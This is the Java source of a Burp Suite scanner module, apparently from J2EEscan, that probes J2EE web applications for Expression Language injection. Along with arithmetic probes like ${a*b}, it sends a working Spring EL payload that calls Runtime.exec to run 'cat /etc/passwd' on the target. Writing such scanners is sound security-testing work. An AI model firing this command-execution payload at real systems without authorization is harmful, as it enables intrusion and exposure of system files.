package burp.j2ee.issues.impl;

import burp.HTTPMatcher;
import static burp.HTTPMatcher.getMatches;
import static burp.HTTPMatcher.isJavaApplicationByURL;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;

import java.net.URL;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Random;
import java.util.Set;

/**
 *
 * This module tries to detect common Expression Language Injection on different
 * J2EE frameworks (Spring, SEAM).
 *
 * This vulnerability usually could lead to remote command execution or
 * authorization bypass issues
 */
public class ELInjection implements IModule {

    private static final String TITLE = "EL (Expression Language) Injection";
    private static final String DESCRIPTION = "J2EEscan identified an EL (Expression Language) "
            + "Injection vulnerability; an expression language makes it possible to easily "
            + "access application data stored in JavaBeans components. <br />"
            + "The EL Injection vulnerability allows a remote user to control data passed "
            + "to the EL Interpreter, allowing attackers, in some cases, to execute code on the server."
            + "<br /><br />"
            + "<b>References</b>:<br /><br />"
            + "http://www.mindedsecurity.com/fileshare/ExpressionLanguageInjection.pdf<br />"
            + "http://cwe.mitre.org/data/definitions/917.html<br />"
            + "https://www.owasp.org/index.php/Expression_Language_Injection<br />"
            + "http://support.springsource.com/security/cve-2011-2730<br />"
            + "http://www.blackhat.com/html/bh-dc-10/bh-dc-10-briefings.html#Byrne<br />"
            + "http://danamodio.com/application-security/discoveries/spring-remote-code-with-expression-language-injection/<br />"
            + "http://jcp.org/aboutJava/communityprocess/mrel/jsr245/index.html<br />"
            + "JSF - https://java.net/jira/browse/JAVASERVERFACES-2247<br />"
            + "MYFACES - https://issues.apache.org/jira/browse/MYFACES-3405<br />";

    private static final String REMEDY = "Update the remote vulnerable library";

    @Override
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        // Execute a basic algorithm operation to detect OGNL code execution
        int MAX_RANDOM_INT = 500;
        Random rand = new Random();
        final int firstInt = rand.nextInt(MAX_RANDOM_INT) + 42 + 42 + rand.nextInt(MAX_RANDOM_INT);
        final int secondInt = rand.nextInt(MAX_RANDOM_INT) + 42 + 42 + rand.nextInt(MAX_RANDOM_INT);
        final String multiplication = Integer.toString(firstInt * secondInt);

        byte[] EL_TEST = "(new+java.util.Scanner((T(java.lang.Runtime).getRuntime().exec(\"cat+/etc/passwd\").getInputStream()),\"UTF-8\")).useDelimiter(\"\\\\A\").next()".getBytes();

        HashMap<byte[], byte[]> EL_INJECTIONS = new HashMap<byte[], byte[]>() {
            {
                put("${applicationScope}".getBytes(), "javax.servlet.context".getBytes());
                put("#{applicationScope}".getBytes(), "javax.servlet.context".getBytes());
                put(String.format("${%d*%d}", firstInt, secondInt).getBytes(), multiplication.getBytes());
                put(String.format("#{%d*%d}", firstInt, secondInt).getBytes(), multiplication.getBytes());
                put(String.format("{{%d*%d}}", firstInt, secondInt).getBytes(), multiplication.getBytes());
            }
        };

        IExtensionHelpers helpers = callbacks.getHelpers();
        List<IScanIssue> issues = new ArrayList<>();
        IRequestInfo reqInfo = callbacks.getHelpers().analyzeRequest(baseRequestResponse);
        URL curURL = reqInfo.getUrl();

        // Skip test for not j2ee applications
        if (!isJavaApplicationByURL(curURL)){
            return issues;
        }


        Set<byte[]> EL_INJECTION_LIST = EL_INJECTIONS.keySet();

        for (byte[] INJ_TEST : EL_INJECTION_LIST) {

            // make a request containing our injection test in the insertion point
            byte[] checkRequest = insertionPoint.buildRequest(INJ_TEST);
            IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
                    baseRequestResponse.getHttpService(), checkRequest);

            // look for matches of our active check grep string
            List<int[]> matches = getMatches(checkRequestResponse.getResponse(), EL_INJECTIONS.get(INJ_TEST), helpers);
            if (matches.size() > 0) {

                issues.add(new CustomScanIssue(
                        baseRequestResponse.getHttpService(),
                        reqInfo.getUrl(),
                        checkRequestResponse,
                        TITLE,
                        DESCRIPTION,
                        REMEDY,
                        Risk.High,
                        Confidence.Tentative
                ));
                
            }
        }

        
        // make a request containing our injection test in the insertion point
        byte[] checkELRequest = insertionPoint.buildRequest(EL_TEST);

        IHttpRequestResponse checkELRequestResponse = callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(), checkELRequest);

        if (HTTPMatcher.isEtcPasswdFile(checkELRequestResponse.getResponse(), helpers)) {
            issues.add(new CustomScanIssue(
                    baseRequestResponse.getHttpService(),
                    reqInfo.getUrl(),
                    checkELRequestResponse,
                    TITLE,
                    DESCRIPTION,
                    REMEDY,
                    Risk.High,
                    Confidence.Tentative
            ));
        }

        return issues;
    }

}
